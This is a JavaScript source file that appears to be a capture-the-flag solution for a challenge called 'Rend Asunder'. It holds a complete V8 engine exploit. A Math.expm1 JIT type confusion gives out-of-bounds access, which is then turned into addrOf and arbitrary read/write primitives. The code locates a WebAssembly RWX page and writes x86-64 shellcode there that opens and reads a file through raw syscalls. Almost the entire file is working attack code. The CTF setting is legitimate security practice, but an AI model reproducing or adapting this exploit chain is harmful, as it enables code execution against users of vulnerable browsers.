// Rend Asunder Flag2 — Math.expm1 → arb r/w → WASM RWX shellcode → read flag2
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
var _lo = 0, _hi = 0;
function split(v) { f64[0] = v; _lo = u32[0] >>> 0; _hi = u32[1] >>> 0; }
function u2d(lo, hi) { u32[0] = lo >>> 0; u32[1] = hi >>> 0; return f64[0]; }

function paintHex(hex) {
  hex = (hex + "0".repeat(64)).substring(0, 64).toLowerCase();
  var bits = [];
  for (var i = 0; i < 64; i++) {
    var v = parseInt(hex.charAt(i), 16); if (isNaN(v)) v = 0;
    for (var b = 3; b >= 0; b--) bits.push((v >> b) & 1);
  }
  var cv = document.createElement("canvas");
  cv.width = 760; cv.height = 760;
  var g = cv.getContext("2d");
  g.fillStyle = "#fff"; g.fillRect(0, 0, 760, 760);
  g.fillStyle = "#ff0000"; g.fillRect(0, 0, 30, 30);
  g.fillStyle = "#00ff00"; g.fillRect(730, 0, 30, 30);
  g.fillStyle = "#0000ff"; g.fillRect(0, 730, 30, 30);
  var OFF = 44, CELL = 42, SQ = 30;
  for (var r = 0; r < 16; r++)
    for (var c = 0; c < 16; c++)
      if (bits[r * 16 + c]) {
        g.fillStyle = "#000";
        g.fillRect(OFF + c * CELL, OFF + r * CELL, SQ, SQ);
      }
  document.write('<body style="margin:0"></body>');
  document.body.appendChild(cv);
}
function fail(c) {
  var h = ("00000000" + (c >>> 0).toString(16)).slice(-8);
  paintHex((h + h + h + h + h + h + h + h).substring(0, 64));
}
function toHex(s, n) {
  var o = "";
  for (var i = 0; i < n; i++) {
    var c = i < s.length ? s.charCodeAt(i) & 0xff : 0;
    o += ("0" + c.toString(16)).slice(-2);
  }
  return o;
}

// WASM: f()->42 + indirect table so instance+0xa0 is populated
var wc = new Uint8Array([
  0,97,115,109, 1,0,0,0,
  1,5,1,96,0,1,127,       // type: ()->i32
  3,2,1,0,                 // func
  4,4,1,112,0,1,           // table funcref min 1
  7,5,1,1,102,0,0,         // export "f"
  9,7,1,0,65,0,11,1,0,     // elem table[0]=func0
  10,6,1,4,0,65,42,11      // code i32.const 42; end
]);
var winst = new WebAssembly.Instance(new WebAssembly.Module(wc), {});
var wf = winst.exports.f;
if (wf() !== 42) { fail(0xbad0001); throw 1; }

// ---- OOB primitives (same as flag1) ----
var ob;
function foo(x) {
  var a = [0.1, 0.2, 0.3, 0.4];
  var tb = [1.1, 2.2, 3.3];
  var o2 = { mz: -0 };
  var b = Object.is(Math.expm1(x), o2.mz);
  a[b * 12] = u2d(0, 0x434343);
  ob = tb;
  return a[b * 100];
}
foo(0);
for (var i = 0; i < 100000; i++) foo("0");
foo(-0);

var victim = [0x13371337, 0xcafe, {}, function () {}];
var ab = new ArrayBuffer(0x2000);
var dv = new DataView(ab);
var vslot = -1;
for (var i = 0; i < 3000; i++) {
  victim[0] = 0xAAAA;
  var x1 = ob[i];
  victim[0] = 0xBBBB;
  if (ob[i] !== x1) { vslot = i; break; }
}
if (vslot < 0) { fail(0xbad0002); throw 1; }
function addrOf(o) { victim[0] = o; return ob[vslot]; }

victim[0] = ab;
var idxAB = -1, idxTA = -1;
for (var i = 0; i < 4000; i++) {
  split(ob[i]);
  if (_lo === 0x2000 || _hi === 0x2000) { idxAB = i; idxTA = i + 1; break; }
}
if (idxAB < 0) { fail(0xbad0003); throw 1; }
split(ob[idxTA]);
var bs_lo = _lo, bs_hi = _hi;

function rd(lo, hi) {
  ob[idxTA] = u2d(lo, hi);
  _lo = dv.getUint32(0, true);
  _hi = dv.getUint32(4, true);
}
function wr64(alo, ahi, vlo, vhi) {
  ob[idxTA] = u2d(alo, ahi);
  dv.setUint32(0, vlo >>> 0, true);
  dv.setUint32(4, vhi >>> 0, true);
}
function R(lo, hi, off) {
  var alo = (lo + off) >>> 0;
  var ahi = hi >>> 0;
  if (alo < (lo >>> 0)) ahi = (ahi + 1) >>> 0;
  rd(alo, ahi);
}

// verify arb
ob[idxTA] = u2d(bs_lo, bs_hi);
dv.setUint32(0, 0x11223344, true);
dv.setUint32(4, 0x55667788, true);
rd(bs_lo, bs_hi);
if (_lo !== 0x11223344 || _hi !== 0x55667788) { fail(0xbad0004); throw 1; }
ob[idxTA] = u2d(bs_lo, bs_hi);

// ---- leak RWX via wasm instance +0xa0 -> [0] ----
split(addrOf(winst));
var Wl = (_lo - 1) >>> 0, Wh = _hi;
R(Wl, Wh, 0xa0);
var IFl = _lo, IFh = _hi;
if (IFl === 0 && IFh === 0) {
  // try nearby offsets for ift_targets
  var found = false;
  for (var off = 0x80; off <= 0xb0; off += 8) {
    R(Wl, Wh, off);
    if (_lo > 0x1000 || _hi > 0) {
      // check if [0] looks like code (b8 2a 00 00 00 c3)
      var tLo = _lo, tHi = _hi;
      R(tLo, tHi, 0);
      if (_lo === 0x00002ab8 && ((_hi & 0xffff) === 0xc300)) {
        IFl = tLo; IFh = tHi; found = true; break;
      }
      // maybe [0] is the page
      R(tLo, tHi, 0);
      // store candidate
      IFl = tLo; IFh = tHi;
    }
  }
}
R(IFl, IFh, 0);
var Rl = _lo, Rh = _hi;

// sanity: prologue b8 2a 00 00 00 c3
R(Rl, Rh, 0);
var prol_ok = (_lo === 0x00002ab8 && ((_hi & 0xffff) === 0xc300));
if (!prol_ok) {
  // scan a few slots of the table array
  var ok = false;
  for (var i = 0; i < 8; i++) {
    R(IFl, IFh, i * 8);
    var cLo = _lo, cHi = _hi;
    R(cLo, cHi, 0);
    if (_lo === 0x00002ab8 && ((_hi & 0xffff) === 0xc300)) {
      Rl = cLo; Rh = cHi; ok = true; break;
    }
  }
  if (!ok) {
    // try direct instance offsets used in other versions
    for (var off = 0x70; off <= 0xf0; off += 8) {
      R(Wl, Wh, off);
      var cLo = _lo, cHi = _hi;
      if (cLo < 0x10000 && cHi === 0) continue;
      R(cLo, cHi, 0);
      if (_lo === 0x00002ab8 && ((_hi & 0xffff) === 0xc300)) {
        Rl = cLo; Rh = cHi; ok = true; break;
      }
      // one more hop
      var mLo = cLo, mHi = cHi;
      R(mLo, mHi, 0);
      var nLo = _lo, nHi = _hi;
      if (nLo > 0x10000 || nHi > 0) {
        R(nLo, nHi, 0);
        if (_lo === 0x00002ab8 && ((_hi & 0xffff) === 0xc300)) {
          Rl = nLo; Rh = nHi; ok = true; break;
        }
      }
    }
  }
  if (!ok) {
    fail(0xbad0010);
    throw 1;
  }
}

// test code exec: mov eax, 0x1337; ret
// B8 37 13 00 00 C3 90 90
wr64(Rl, Rh, 0x001337B8, 0x9090C300);
var r = wf();
if (r !== 0x1337) {
  // try without restore issues
  fail(0xbad0011);
  throw 1;
}

// ---- allocate buffers for path + read result in JS heap, get their backing stores ----
// Path string "flag2\0" in an ArrayBuffer
var pathAB = new ArrayBuffer(0x100);
var pathDV = new DataView(pathAB);
var pathStr = "flag2";
for (var i = 0; i < pathStr.length; i++) pathDV.setUint8(i, pathStr.charCodeAt(i));
pathDV.setUint8(pathStr.length, 0);

var readAB = new ArrayBuffer(0x2000);
var readDV = new DataView(readAB);
var readF = new Float64Array(readAB);

// Get backing store pointers of pathAB and readAB via addrOf + object layout
// JSArrayBuffer: after finding via OOB like before, or:
// addrOf(pathAB) untagged + 0x20 = backing store field (same as we use)
function getBS(buf) {
  // temporarily put buf in victim and scan — easier: reuse hijack to read object
  split(addrOf(buf));
  var ol = (_lo - 1) >>> 0, oh = _hi;
  R(ol, oh, 0x20); // backing_store at +0x20 in JSArrayBuffer for this V8
  return [_lo, _hi];
}
// Actually for JSArrayBuffer the backing_store offset may be +0x20 from object start
// Validate against known ab
split(addrOf(ab));
var abl = (_lo - 1) >>> 0, abh = _hi;
// try offsets to find matching bs_lo
var bsOff = -1;
for (var off = 0x10; off <= 0x40; off += 8) {
  R(abl, abh, off);
  if (_lo === bs_lo && _hi === bs_hi) { bsOff = off; break; }
}
if (bsOff < 0) {
  // try without exact match - use +0x20
  bsOff = 0x20;
}
function getBacking(buf) {
  split(addrOf(buf));
  var ol = (_lo - 1) >>> 0, oh = _hi;
  R(ol, oh, bsOff);
  return [_lo, _hi];
}
var pBS = getBacking(pathAB);
var rBS = getBacking(readAB);
var Bufl = pBS[0], Bufh = pBS[1];
var RBl = rBS[0], RBh = rBS[1];

// Also need a small scratch for nbytes store at pathAB+8 or separate
// We'll store nbytes at readAB-side: use pathAB+8 for rax result via movabs

function le_bytes(lo, hi) {
  return [
    lo & 255, (lo >>> 8) & 255, (lo >>> 16) & 255, (lo >>> 24) & 255,
    hi & 255, (hi >>> 8) & 255, (hi >>> 16) & 255, (hi >>> 24) & 255
  ];
}
function A(lo, off) { return (lo + off) >>> 0; }
function CY(lo, off) { return ((lo + off) > 0xffffffff) ? 1 : 0; }

// shellcode: open(path) ; read(fd, buf, 0x2000) ; store nbytes at path+8 ; ret
// only caller-saved regs
var sc = []
  .concat([0xB8, 0x02, 0, 0, 0])                 // mov eax, 2 (sys_open)
  .concat([0x48, 0xBF]).concat(le_bytes(Bufl, Bufh)) // movabs rdi, path
  .concat([0x31, 0xF6])                           // xor esi, esi (O_RDONLY)
  .concat([0x0F, 0x05])                           // syscall
  .concat([0x48, 0x89, 0xC7])                     // mov rdi, rax (fd)
  .concat([0x31, 0xC0])                           // xor eax, eax (sys_read=0)
  .concat([0x48, 0xBE]).concat(le_bytes(RBl, RBh)) // movabs rsi, buf
  .concat([0xBA, 0, 0x20, 0, 0])                  // mov edx, 0x2000
  .concat([0x0F, 0x05])                           // syscall
  .concat([0x48, 0xA3]).concat(le_bytes(A(Bufl, 8), (Bufh + CY(Bufl, 8)) >>> 0)) // movabs [path+8], rax
  .concat([0xC3]);                                // ret

// write shellcode to RWX page 8 bytes at a time
for (var i = 0; i < sc.length; i += 8) {
  var lo = sc[i] | (sc[i+1] << 8) | (sc[i+2] << 16) | (sc[i+3] << 24);
  var hi = (sc[i+4] | (sc[i+5] << 8) | (sc[i+6] << 16) | (sc[i+7] << 24)) >>> 0;
  if (i + 4 >= sc.length) {
    // pad
    hi = 0;
    lo = 0;
    for (var j = 0; j < 8 && i + j < sc.length; j++) {
      if (j < 4) lo |= (sc[i+j] << (8 * j));
      else hi |= (sc[i+j] << (8 * (j - 4)));
    }
    lo >>>= 0; hi >>>= 0;
  }
  wr64(A(Rl, i), (Rh + CY(Rl, i)) >>> 0, lo >>> 0, hi >>> 0);
}

// fix last partial write properly
function writeSC() {
  for (var i = 0; i < sc.length; i += 8) {
    var lo = 0, hi = 0;
    for (var j = 0; j < 8; j++) {
      var b = (i + j < sc.length) ? sc[i + j] : 0x90;
      if (j < 4) lo |= (b << (8 * j));
      else hi |= (b << (8 * (j - 4)));
    }
    wr64(A(Rl, i), (Rh + CY(Rl, i)) >>> 0, lo >>> 0, hi >>> 0);
  }
}
writeSC();

var ret = wf(); // run shellcode; return value is nbytes in rax also stored

// read nbytes from pathAB+8
var nbytes = pathDV.getUint32(8, true);
var nbytes_hi = pathDV.getUint32(12, true);

// extract flag from read buffer
var content = "";
var lim = nbytes > 0 && nbytes < 0x2000 ? nbytes : 200;
for (var i = 0; i < lim; i++) content += String.fromCharCode(readDV.getUint8(i));

var m = content.match(/\^FLAG\^([0-9a-fA-F]{64})\$FLAG\$/) ||
        content.match(/([0-9a-fA-F]{64})/);
if (m) {
  paintHex(m[1] || m[0]);
} else {
  // dump nbytes + first bytes
  var hdr = ("0000" + (nbytes & 0xffff).toString(16)).slice(-4);
  paintHex(hdr + toHex(content, 30));
}
